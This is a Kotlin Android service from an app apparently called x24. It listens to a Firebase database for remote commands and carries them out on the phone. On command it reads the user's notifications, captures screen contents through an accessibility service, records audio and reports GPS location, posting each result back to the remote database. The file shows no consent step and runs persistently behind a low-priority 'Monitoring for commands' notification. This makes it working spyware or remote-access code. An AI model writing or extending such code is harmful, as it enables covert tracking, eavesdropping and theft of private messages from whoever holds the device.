package com.jonas.x24.services

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.jonas.x24.AudioRecordManager
import com.jonas.x24.services.x24AccessibilityService
import com.jonas.x24.services.x24NotificationService

class FirebaseCommandService : Service() {

    private lateinit var database: DatabaseReference
    private var sessionKey: String? = null
    private var listener: ValueEventListener? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        var key = intent?.getStringExtra("SESSION_KEY")

        if (key == null) {
            val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
            key = prefs.getString("SESSION_KEY", null)
        }

        if (key != null) {
            sessionKey = key
            setupFirebaseListener(key)
        }

        startForeground(1001, createNotification())
        return START_STICKY
    }

    private fun setupFirebaseListener(key: String) {
        database = FirebaseDatabase.getInstance().reference.child("sessions").child(key)

        listener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val commandsSnapshot = snapshot.child("commands")
                val lastCommandNode = commandsSnapshot.children.lastOrNull()

                if (lastCommandNode != null) {
                    val commandStr = lastCommandNode.child("command").value as? String
                    val processed = lastCommandNode.child("processed").value as? Boolean ?: false

                    if (commandStr != null && !processed) {
                        // Mark as processed immediately so we don't duplicate
                        lastCommandNode.ref.child("processed").setValue(true)
                        processCommand(commandStr)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("FirebaseService", "Listener cancelled: ${error.message}")
            }
        }

        database.addValueEventListener(listener!!)
    }

    private fun processCommand(command: String) {
        Log.d("FirebaseService", "Received command: $command")
        val currentSessionKey = sessionKey ?: return

        when (command) {
            "READ_NOTIFICATIONS" -> readNotifications()
            "READ_SCREEN" -> readScreen()
            "START_RECORD_AUDIO" -> {
                AudioRecordManager.startRecording(this, currentSessionKey)
            }
            "STOP_RECORD_AUDIO" -> {
                AudioRecordManager.stopRecording(currentSessionKey)
            }
            "GET_LOCATION" -> getLocation()
        }
    }

    private fun postResult(type: String, data: String) {
        val currentSessionKey = sessionKey ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    private fun getLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            postResult("ERROR", "Location permissions denied")
            return
        }

        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var location: Location? = null
        try {
            location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }
        } catch(e: Exception) {
            Log.e("FirebaseService", "Location error", e)
        }

        if (location != null) {
            val geocoder = Geocoder(this, java.util.Locale.getDefault())
            try {
                val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                if (!addresses.isNullOrEmpty()) {
                    val address = addresses[0]
                    val locStr = "${address.locality ?: "Unknown City"}, ${address.adminArea ?: ""}"
                    postResult("TEXT", "Location: $locStr\nCoords: ${location.latitude}, ${location.longitude}")
                    return
                }
            } catch (e: Exception) { }
            postResult("TEXT", "Coords: ${location.latitude}, ${location.longitude}")
        } else {
            postResult("ERROR", "Could not determine location")
        }
    }

    private fun readScreen() {
        val service = x24AccessibilityService.instance
        if (service != null) {
            val screenContext = service.getScreenContext()
            postResult("TEXT", "Screen Context:\n$screenContext")
        } else {
            postResult("ERROR", "Accessibility service not running")
        }
    }

    private fun readNotifications() {
        val activeNotifs = x24NotificationService.instance?.getActiveNotificationsList() ?: emptyList()
        val recentNotifs = x24NotificationService.recentNotifications

        val builder = java.lang.StringBuilder()

        if (activeNotifs.isNotEmpty()) {
            builder.append("Active Notifications:\n")
            builder.append(activeNotifs.joinToString("\n"))
            builder.append("\n\n")
        } else {
            builder.append("No active notifications.\n\n")
        }

        if (recentNotifs.isNotEmpty()) {
            builder.append("Recent Notifications:\n")
            builder.append(recentNotifs.joinToString("\n"))
        } else {
            builder.append("No recent notifications.")
        }

        postResult("TEXT", builder.toString().trim())
    }

    private fun createNotification(): android.app.Notification {
        val channelId = "x24_monitor_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Monitor Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("x24 Active")
            .setContentText("Monitoring for commands...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        if (listener != null && ::database.isInitialized) {
            database.removeEventListener(listener!!)
        }
    }
}
